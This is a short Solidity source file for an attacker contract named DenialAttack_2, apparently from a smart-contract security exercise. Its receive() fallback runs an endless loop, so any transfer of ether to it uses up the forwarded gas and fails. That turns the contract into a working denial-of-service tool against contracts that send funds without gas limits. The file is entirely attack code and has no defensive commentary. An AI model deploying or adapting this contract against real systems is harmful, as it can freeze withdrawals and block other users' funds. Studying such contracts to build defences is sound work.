// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract DenialAttack_2 {
    receive() external payable {
        while (true) {}
    }
}
